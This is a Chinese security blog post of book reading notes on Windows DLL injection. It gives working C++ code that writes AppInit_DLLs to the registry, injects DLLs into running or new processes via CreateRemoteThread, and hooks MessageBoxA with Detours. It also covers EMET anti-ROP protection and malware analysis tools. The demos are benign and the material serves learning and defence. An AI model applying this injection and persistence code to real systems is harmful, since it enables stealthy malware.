<p><span class="md-line md-end-block">SetWindowsHookEx可以在调用时，将DLL映射到其他进程中，不过若将DLL的路径配置在注册表的AppInit_DLLs项中，就可以在系统启动时，将任意DLL加载到其他进程中。</span><span class="md-line md-end-block">运行regedit,在<span spellcheck="false"><code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code></span>中找到<span spellcheck="false"><code>AppInit_DLLs</code></span>（在这里填写DLL路径）和<span spellcheck="false"><code>LoadAppInit_DLLs</code></span>（AppInit_DLLs启用或禁止）</span></p>
<p><img class="alignnone size-full wp-image-99917 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491378176972.png" alt=".1491378176972" width="1483" height="864" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491378176972.png 1483w, http://www.mottoin.com/wp-content/uploads/2017/04/1491378176972-300x175.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1491378176972-768x447.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1491378176972-1024x597.png 1024w" sizes="(max-width: 1483px) 100vw, 1483px" /></p>
<blockquote><p><span class="md-line md-end-block">Widows XP中没有LoadAppInit_DLLs这项。在Win7中多了一个叫做<span spellcheck="false"><code>RequireSignedAppInit_DLLs</code></span>的项，这一项代表只允许加载经过签名的DLL。</span></p></blockquote>
<p><span class="md-line md-end-block">详细可看：<span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx">AppInit_DLLs in Windows 7 and Windows Server 2008 R2</a></span></span></p>
<p><span class="md-line md-end-block">在x64系统中，关于x32程序的相关设定已被重定向到Wow6432Node中。</span><span class="md-line md-end-block">AppInit_DLLs中所配置的DLL是通过user32.dll来加载的，因此，对于原本就不依赖(不加载)user32.dll的进程来说，这个配置是无效的。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// writeappinit.cpp
//

#include "stdafx.h"
#include &lt;Windows.h&gt;


int _tmain(int argc, _TCHAR* argv[])
{
	if(argc &lt; 2){
		fprintf(stderr, "%s &lt;DLL Name&gt;\n", argv[0]);
		return 1;
	}
	
	HKEY hKey;
	LSTATUS lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		NULL, KEY_ALL_ACCESS, &amp;hKey);
	if(lResult != ERROR_SUCCESS){
		printf("Error: RegOpenKeyEx failed.\n");
		return -1;
	}

	DWORD dwSize, dwType;
	TCHAR szDllName[256];

	RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &amp;dwType, NULL, &amp;dwSize);
    RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &amp;dwType, (LPBYTE)szDllName, &amp;dwSize);
	printf("AppInit_DLLs: %s -&gt; ", szDllName);
	lstrcpy(szDllName, argv[1]);
	
	lResult = RegSetValueEx(hKey, "AppInit_DLLs", 
		0, REG_SZ, (PBYTE)szDllName, lstrlen(szDllName) + 1);
	if(lResult != ERROR_SUCCESS){
		printf("Error: RegSetValueEx failed.\n");
	}

	RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &amp;dwType, NULL, &amp;dwSize);
    RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &amp;dwType, (LPBYTE)szDllName, &amp;dwSize);
	printf("%s\n", szDllName);

	RegCloseKey(hKey);
	return 0;
}</pre>
<p><span class="md-line md-end-block">运行程序：</span></p>
<p><img class="alignnone size-full wp-image-99918 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491382019538.png" alt=".1491382019538" width="1418" height="799" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491382019538.png 1418w, http://www.mottoin.com/wp-content/uploads/2017/04/1491382019538-300x169.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1491382019538-768x433.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1491382019538-1024x577.png 1024w" sizes="(max-width: 1418px) 100vw, 1418px" /></p>
<blockquote><p><span class="md-line md-end-block">在Win7中，需要将<span spellcheck="false"><code>LoadAppInit_DLLs</code></span>的值改为1</span></p></blockquote>
<p><span class="md-line md-end-block">使用该程序向注册表的AppInit_DLLs项写入loging.dll的路径。此后，凡是加载了user32.dll的进程，同时也会加载<span spellcheck="false"><code>loging.dll</code></span>。</span></p>
<h3 class="md-end-block md-heading">通过CreateRemoteThread在其他进程中创建线程</h3>
<p><span class="md-line md-end-block">使用<span spellcheck="false"><code>CreateRemoteThread</code></span>这个API函数在其他进程中创建线程，这个函数可以在新线程中运行LoadLibrary，从而使得其他进程强制加载某个DLL。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">HANDLE WINAPI CreateRemoteThread(
  _In_  HANDLE                 hProcess,  //进程句柄
  _In_  LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
  _In_  SIZE_T                 dwStackSize, //栈初始长度(字节数)
  _In_  LPTHREAD_START_ROUTINE lpStartAddress, 
  _In_  LPVOID                 lpParameter, //新线程的参数指针
  _In_  DWORD                  dwCreationFlags, //创建标志
  _Out_ LPDWORD                lpThreadId //分配的线程ID指针
);</pre>
<p><span class="md-line md-end-block"><span class=""><strong>Loadlibrary的参数必须位于目标进程内部。因此，LoadLibrary所需要的参数字符串必须事先写入目标进程的内存空间</strong></span></span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// injectcode.h

int InjectDLLtoProcessFromName(TCHAR *szTarget, TCHAR *szDllPath);
int InjectDLLtoProcessFromPid(DWORD dwPid, TCHAR *szDllPath);
int InjectDLLtoNewProcess(TCHAR *szCommandLine, TCHAR *szDllPath);</pre>
<p><span class="md-line md-end-block">上面三个函数的功能：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">InjectDLLtoProcessFromName:按照可执行文件名找到相应的进程并注入DLL</span></li>
<li><span class="md-line md-end-block">InjectDLLtoProcessFromPid：按照进程ID找到相应的进程并注入DLL</span></li>
<li><span class="md-line md-end-block">创建新进程并注入DLL</span></li>
</ul>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// injectcode.cpp
//

#include "stdafx.h"
#include &lt;tlhelp32.h&gt;
#include "injectcode.h"


DWORD GetProcessIdFromName(TCHAR *szTargetProcessName)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnap == INVALID_HANDLE_VALUE)
		return 0;
	
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	
	DWORD dwProcessId = 0;
	BOOL bResult = Process32First(hSnap, &amp;pe);

	while(bResult){
		if(!lstrcmp(pe.szExeFile, szTargetProcessName)){
			dwProcessId = pe.th32ProcessID;
			break;
		}
		bResult = Process32Next(hSnap, &amp;pe);
	}
	CloseHandle(hSnap);
	
	return dwProcessId;
}


int InjectDLL(HANDLE hProcess, TCHAR *szDllPath)
{
	int szDllPathLen = lstrlen(szDllPath) + 1;

	PWSTR RemoteProcessMemory = (PWSTR)VirtualAllocEx(hProcess, 
		NULL, szDllPathLen, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if(RemoteProcessMemory == NULL)
		return -1;
	
	BOOL bRet = WriteProcessMemory(hProcess, 
		RemoteProcessMemory, (PVOID)szDllPath, szDllPathLen, NULL);
	if(bRet == FALSE)
		return -1;
	
	PTHREAD_START_ROUTINE pfnThreadRtn;
	pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(
		GetModuleHandle("kernel32"), "LoadLibraryA");
	if(pfnThreadRtn == NULL)
		return -1;
	
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
		pfnThreadRtn, RemoteProcessMemory, 0, NULL);
	if(hThread == NULL)
		return -1;

	WaitForSingleObject(hThread, INFINITE);
	
	VirtualFreeEx(hProcess, 
		RemoteProcessMemory, szDllPathLen, MEM_RELEASE);

	CloseHandle(hThread);
	return 0;
}


int InjectDLLtoExistedProcess(DWORD dwPid, TCHAR *szDllPath)
{
	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | 
		PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION , FALSE, dwPid);
	if(hProcess == NULL)
		return -1;
	/*
	BOOL bJudgeWow64;
	IsWow64Process(hProcess, &amp;bJudgeWow64);
	if(bJudgeWow64 == FALSE){
		CloseHandle(hProcess);
		return -1;
	}
	*/
	if(InjectDLL(hProcess, szDllPath))
		return -1;

	CloseHandle(hProcess);
	return 0;
}


int InjectDLLtoProcessFromName(TCHAR *szTarget, TCHAR *szDllPath)
{
	DWORD dwPid = GetProcessIdFromName(szTarget);
	if(dwPid == 0)
		return -1;
	if(InjectDLLtoExistedProcess(dwPid, szDllPath))
		return -1;
	return 0;
}


int InjectDLLtoProcessFromPid(DWORD dwPid, TCHAR *szDllPath)
{
	if(InjectDLLtoExistedProcess(dwPid, szDllPath))
		return -1;
	return 0;
}


int InjectDLLtoNewProcess(TCHAR *szCommandLine, TCHAR *szDllPath)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&amp;si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);

	BOOL bResult = CreateProcess(NULL, szCommandLine, NULL, NULL,
		FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
	if(bResult == FALSE)
		return -1;

	int nRet = -1;
	/*
	BOOL bJudgeWow64;
	IsWow64Process(pi.hProcess, &amp;bJudgeWow64);
	if(bJudgeWow64 == FALSE)
		goto _Exit;
	*/
	if(InjectDLL(pi.hProcess, szDllPath))
		goto _Exit;

	nRet = 0;

_Exit:
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return nRet;
}</pre>
<p><span class="md-line md-end-block">运行该程序时，以及IE关闭时都会弹出相应的消息框。</span></p>
<h3 class="md-end-block md-heading">注入函数</h3>
<p><span class="md-line md-end-block">只要能够将任意函数(代码)事先复制到目标进程内部，就可以用<span spellcheck="false"><code>CreateRemoteThread</code></span>来运行。</span></p>
<blockquote><p><span class="md-line md-end-block">在Windows中，只要拥有足够的权限，就可以随意访问其他进程的内存空间，基本可以自由地向其他进程注入代码，而且即便程序不是调试器，也可以比较容易地骗过其他的进程。</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><strong>代码注入要实现的功能和DLL注入类似，但代码注入的优点如下：</strong></span></span></p>
<ol class="ol-list" start="">
<li><span class="md-line md-end-block"><span class=""><strong>占用内存少</strong></span></span></li>
</ol>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block">若注入的数据或代码比较少，直接采用代码注入可达到效果，且占用内存比较少</span></li>
</ul>
<ol class="ol-list" start="2">
<li><span class="md-line md-end-block"><span class=""><strong>难以查找痕迹</strong></span></span></li>
</ol>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block">采用DLL注入会在目标进程中留下相关痕迹，很容易被判断出目标进程是否执行过注入操作。采用代码注入几乎不会留下任何痕迹，所以恶意代码中大量使用代码注入</span></li>
</ul>
<ol class="ol-list" start="3">
<li><span class="md-line md-end-block"><span class=""><strong>其他</strong></span></span></li>
</ol>
<p><span class="md-line md-end-block"> <span class=""><strong>DLL注入技术主要用于在代码量大且复杂的时候，而代码注入技术则适用于代码量小且简单的情况</strong></span></span></p>
<h2 class="md-end-block md-heading">API钩子</h2>
<p><span class="md-line md-end-block">在程序中插入额外的逻辑称为“钩子”，而其中对API插入额外逻辑称为“API钩子”。钩子是一种截取信息、更改程序执行流向、添加新功能的技术。</span></p>
<p><span class="md-line md-end-block">API钩子大体分为两种：</span></p>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block">改写目标函数开头几个字节</span></li>
<li><span class="md-line md-end-block">改写IAT(导入表)</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">IAT型钩子详细可见<span class=""><a spellcheck="false" href="https://www.amazon.com/dp/1572315482">Advanced Windows</a></span></span></p></blockquote>
<p><span class="md-line md-end-block">API钩子技术图表：</span></p>
<p><img class="alignnone size-full wp-image-99919 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491403435120.png" alt=".1491403435120" width="632" height="297" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491403435120.png 632w, http://www.mottoin.com/wp-content/uploads/2017/04/1491403435120-300x141.png 300w" sizes="(max-width: 632px) 100vw, 632px" /></p>
<h3 class="md-end-block md-heading">用Detours实现一个简单的API钩子</h3>
<p><span class="md-line md-end-block">使用<span class=""><a spellcheck="false" href="https://www.microsoft.com/en-us/research/project/detours/">Detours</a></span>的API钩子库可以用少量代码实现API钩子。只要知道DLL所导出的函数，就可以在运行时对该函数的调用进行劫持。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">//detourshook.h
#ifdef DETOURSHOOK_EXPORTS
#define DETOURSHOOK_API __declspec(dllexport)
#else
#define DETOURSHOOK_API __declspec(dllimport)
#endif

DETOURSHOOK_API int WINAPI HookedMessageBoxA(HWND hWnd, 
	LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);</pre>
<p><span class="md-line md-end-block">以下代码可以将<span spellcheck="false"><code>user32.dll</code></span>导出的函数<span spellcheck="false"><code>MessageBoxA</code></span>替换成<span spellcheck="false"><code>HookedMessageBoxA</code></span>。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// dllmain.cpp
//

#include "stdafx.h"
#include "detours.h"
#include "detourshook.h"


static int (WINAPI * TrueMessageBoxA)(HWND hWnd, LPCTSTR lpText, 
	LPCTSTR lpCaption, UINT uType) = MessageBoxA;

DETOURSHOOK_API int WINAPI HookedMessageBoxA(HWND hWnd, 
	LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
{
	int nRet = TrueMessageBoxA(hWnd, lpText, "Hooked Message", uType);
	return nRet;
}


int DllProcessAttach(VOID)
{
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);	
	if(DetourTransactionCommit() == NO_ERROR)
		return -1;
	return 0;
}


int DllProcessDetach(VOID)
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);
	DetourTransactionCommit();
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DllProcessAttach();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		DllProcessDetach();
		break;
	}
	return TRUE;
}</pre>
<p><span class="md-line md-end-block">将以下文件添加到工程中，并编译：</span></p>
<p><img class="alignnone size-full wp-image-99920 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491390313942.png" alt=".1491390313942" width="975" height="435" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491390313942.png 975w, http://www.mottoin.com/wp-content/uploads/2017/04/1491390313942-300x134.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1491390313942-768x343.png 768w" sizes="(max-width: 975px) 100vw, 975px" /></p>
<p><span class="md-line md-end-block">当DLLMain收到<span spellcheck="false"><code>DLL_PROCESS_ATTACH</code></span>消息时，会调用<span spellcheck="false"><code>DllProcessAttach()</code></span>函数。即，当DLL被加载到进程中时，API钩子就开始生效。</span><span class="md-line md-end-block"><span spellcheck="false"><code>DllProcessAttach</code></span>用于挂载钩子，<span spellcheck="false"><code>DllProcessDetach</code></span>用于解除钩子。</span><span class="md-line md-end-block">在函数内部，会先调用<span spellcheck="false"><code>DetourTransactionBegin</code></span>和<span spellcheck="false"><code>DetourUpdateThread</code></span>,然后再用<span spellcheck="false"><code>DetourAttach</code></span>或者<span spellcheck="false"><code>DetcourDetach</code></span>来挂载或解除钩子。</span><span class="md-line md-end-block">最后，程序调用<span spellcheck="false"><code>DetourTransactionCommit</code></span>函数并退出。</span></p>
<h3 class="md-end-block md-heading">修改消息框的标题栏</h3>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>HookedMessageBoxA</code></span>函数的内部会调用<span spellcheck="false"><code>TrueMessageBoxA</code></span>，也就是原始的<span spellcheck="false"><code>MessageBoxA</code></span>函数。</span></p>
<p><span class="md-line md-end-block">为了确认<span spellcheck="false"><code>HookedMessageBoxA</code></span>确实被调用过，可以将消息框标题栏改为“Hooked Message”。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// helloworld.cpp

#include "stdafx.h"
#include &lt;Windows.h&gt;


int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE h = LoadLibrary("detourshook.dll");
	MessageBoxA(GetForegroundWindow(), 
		"Hello World! using MessageBoxA", "Message", MB_OK);
	FreeLibrary(h);
	return 0;
}
</pre>
<p><img class="alignnone size-full wp-image-99921 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491390958676.png" alt=".1491390958676" width="196" height="108" /></p>
<p><span class="md-line md-end-block">根据环境和对象文件不同，API钩子也有各种各样的实现方法，<span spellcheck="false"><code>Detours</code></span>是一种非常简单的方法来实现的，详情可见<span class=""><a spellcheck="false" href="https://www.cs.columbia.edu/~junfeng/10fa-e6998/papers/detours.pdf">Detours: Binary Interception of Win32 Functions </a></span>.</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>钩子的原理是将函数开头的几个字节替换成jmp指令，强制跳转到另一个函数。</strong></span></span></p>
<blockquote><p><span class="md-line md-end-block">以上所讲API钩子技术基本只适用于用户级的DLL所导出的函数，但也可以通过劫持非公开的API等方式，对运行在内核领域(Ring0)的驱动程序挂载钩子。</span></p></blockquote>
<h2 class="md-end-block md-heading">观察反ROP机制</h2>
<p><span class="md-line md-end-block">EMET全称为<span class=""><a spellcheck="false" href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit">Enhanced Mitigation Experience Toolkit</a></span>（增强减灾体验工具），是微软发布的免费漏洞缓解工具。EMET通过使用安全缓解技术，防止软件中的漏洞被成功利用。这些安全缓解技术不能保证漏洞不被利用。但是它使得利用变得困难。</span><span class="md-line md-end-block">EMET还提供了可配置的SSL / TLS证书固定功能打到证书信任。此功能旨在检测利用公钥（PKI）进行中间人攻击的攻击。</span></p>
<p><span class="md-line md-end-block">v3.5版本开始新增反ROP(Anti-ROP)机制</span></p>
<h3 class="md-end-block md-heading">ROPGuard</h3>
<p><span class="md-line md-end-block">ROPGuard是一种检查“RETN所返回的目标有没有相对应的CALL”(即CALL-RETN匹配性)的机制，方案简单，却能有效监测出Return-into-libc和ROP攻击</span></p>
<p><span class="md-line md-end-block">CALL用来调用子程序，而在子程序的结尾，（大部分情况下）都会执行RETN，而子程序结尾的RETN所返回的目标地址，应该就是CALL指令的下面一条指令。</span><span class="md-line md-end-block">然而在Return-into-libc攻击中，RETN会跳转到函数的开头，而ROP攻击中则使用了非常多的RETN，这些都会导致出现“RETN并不是返回CALL的下一条指令”的情况。</span></p>
<p><span class="md-line md-end-block">因此，该方案的本质在于关注CALL和RETN的匹配性(调用栈回溯)，以此来检测ROP和Return-into-libc攻击。</span></p>
<h2 class="md-end-block md-heading">分析恶意软件</h2>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block">REMnux分析恶意软件:<span class=""><a spellcheck="false" href="https://remnux.org/">REMnux</a></span>是一个用于分析恶意软件操作的OS，基于Ubuntu开发</span></li>
<li><span class="md-line md-end-block">ClamAV检测恶意软件和漏洞攻击</span></li>
<li><span class="md-line md-end-block">用Zero Wine Tryouts分析恶意软件</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">Zero Wine Tryouts是一个开源的自动分析工具，只要将文件上传上去就可以显示结果。与REMnux不同点在于，它主要通过动态分析来得出结果。</span></p></blockquote>
<h2>PDF版本</h2>
<p><span style="color: #ff0000;"><strong>链接: <a style="color: #ff0000;" href="http://pan.baidu.com/s/1bWhyJO">http://pan.baidu.com/s/1bWhyJO</a> 密码: rd3j</strong></span></p>
<p>&nbsp;</p>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>*作者：<a style="color: #ff0000;" href="http://b404.xyz/">Jirairya</a>，未经允许不得转载</strong></span></p>
                                                        <div class="entry-copyright"><p>原创文章，作者：jirairya，如若转载，请注明出处：http://www.mottoin.com/99834.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/jirairya" rel="tag">Jirairya</a><a href="http://www.mottoin.com/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6" rel="tag">二进制</a><a href="http://www.mottoin.com/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6%e5%85%a5%e9%97%a8" rel="tag">二进制入门</a><a href="http://www.mottoin.com/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0" rel="tag">二进制学习笔记</a><a href="http://www.mottoin.com/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6%e5%ae%89%e5%85%a8" rel="tag">二进制安全</a><a href="http://www.mottoin.com/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%bc%8f%e6%b4%9e" rel="tag">二进制漏洞</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="99834"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(1)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="413" target="_blank" href="http://www.mottoin.com/user/jirairya/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Jirairya" />                                                Jirairya                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="99834"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/99834.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F99834.html&title=%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F99834.html&title=%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/87593.html" title="常见恶意软件工具分析（一）">常见恶意软件工具分析（一）</a></li><li><a href="http://www.mottoin.com/88716.html" title="逆向分享 – Reversing.Kr (3-final-ing)">逆向分享 – Reversing.Kr (3-final-ing)</a></li><li><a href="http://www.mottoin.com/84388.html" title="CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞">CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞</a></li><li><a href="http://www.mottoin.com/101183.html" title="从命令行调用JNI函数并传递Java对象参数">从命令行调用JNI函数并传递Java对象参数</a></li><li><a href="http://www.mottoin.com/98611.html" title="Android / Ztorg恶意软件拆解分析（第2部分）">Android / Ztorg恶意软件拆解分析（第2部分）</a></li><li><a href="http://www.mottoin.com/105178.html" title="数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机">数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机</a></li><li><a href="http://www.mottoin.com/92844.html" title="使用Afl-fuzz (American Fuzzy Lop) 进行Fuzzing测试">使用Afl-fuzz (American Fuzzy Lop) 进行Fuzzing测试</a></li><li><a href="http://www.mottoin.com/104639.html" title="大型挂马团伙“擒狼”攻击分析及溯源报告">大型挂马团伙“擒狼”攻击分析及溯源报告</a></li><li><a href="http://www.mottoin.com/101998.html" title="远控木马中的VIP：盗刷网购账户购买虚拟礼品卡">远控木马中的VIP：盗刷网购账户购买虚拟礼品卡</a></li><li><a href="http://www.mottoin.com/104938.html" title="远控木马上演白利用偷天神技：揭秘假破解工具背后的盗刷暗流">远控木马上演白利用偷天神技：揭秘假破解工具背后的盗刷暗流</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/99834.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/jirairya/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Jirairya" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Jirairya</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/100447.html" title="ApiScout:无损Windows API信息恢复">ApiScout:无损Windows API信息恢复</a></li>
                                    <li><a href="http://www.mottoin.com/99834.html" title="有趣的二进制读书笔记">有趣的二进制读书笔记</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
